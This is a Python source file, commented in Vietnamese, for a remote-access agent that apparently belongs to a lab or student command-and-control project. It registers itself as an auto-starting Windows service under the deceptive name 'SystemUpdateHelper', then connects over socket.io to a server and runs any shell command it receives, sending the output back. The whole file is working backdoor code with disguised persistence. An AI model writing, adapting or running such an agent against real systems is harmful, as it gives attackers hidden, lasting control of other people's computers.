import socketio
import time
import subprocess
import threading 
import platform
import sys
import os

# 1. Cau hinh
sio = socketio.Client()
SERVER_URL = 'http://localhost:80'
MY_ID = 'agent_007'

# 2. Ham cai dat Persistence (Service)
def install_service():
    service_name = "SystemUpdateHelper" # Ten gia mao
    
    # Lay duong dan tuyet doi cua python va script hien tai
    python_exe = sys.executable
    script_path = os.path.abspath(__file__)
    
    # Lenh sc create (luu y dau cach sau dau =)
    cmd = f'sc create "{service_name}" binPath= "{python_exe} {script_path}" start= auto'
    
    try:
        # Kiem tra xem service da ton tai chua bang cach chay thu sc query
        subprocess.check_output(f'sc query "{service_name}"', shell=True, stderr=subprocess.STDOUT)
        print(f"[!] Service '{service_name}' da ton tai.")
    except:
        # Neu chua co thi tao moi
        try:
            subprocess.check_output(cmd, shell=True)
            print(f"[+] Da cai dat Persistence: Service '{service_name}' created.")
        except Exception as e:
            print(f"[!] Loi cai dat Persistence: {e}")

# 3. Ham thuc thi lenh (Worker Thread)
def run_command(cmd):
    try:
        # thuc thi lenh
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout, stderr = proc.communicate(timeout=20) # Tang timeout len xiu
        
        # xu ly ket qua (giai ma cp437 cho windows hoac utf-8)
        try:
            output = stdout.decode('cp437') + stderr.decode('cp437')
        except:
            output = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')
            
    except Exception as e:
        output = str(e)

    # gui ket qua ve server
    sio.emit('command_result', {'agent_id': MY_ID, 'output': output})

# 4. Cac su kien lang nghe
@sio.event
def connect():
    print("[+] connected to server")
    sio.emit('register', {'agent_id': MY_ID, 'os': platform.system()})

@sio.event
def execute_command(data):
    cmd = data.get('cmd')
    print(f"[*] received command: {cmd}")
    
    # Tao luong rieng de chay lenh, giup agent khong bi treo
    t = threading.Thread(target=run_command, args=(cmd,))
    t.start()

@sio.event
def disconnect():
    print("[-] disconnected from server")

# 5. Ham chinh
def main():
    # Buoc 1: Thu cai dat service ngay khi chay
    install_service()
    
    # Buoc 2: Vong lap ket noi C2
    while True:
        try:
            print(f"[*] connecting to {SERVER_URL}...")
            # Them transports websocket de tranh loi packet queue
            sio.connect(SERVER_URL, transports=['websocket'])
            sio.wait()
        except Exception as e:
            print(f"[!] connection failed: {e}")
            print("[*] retrying in 5s...")
            time.sleep(5)

if __name__ == '__main__':
    main()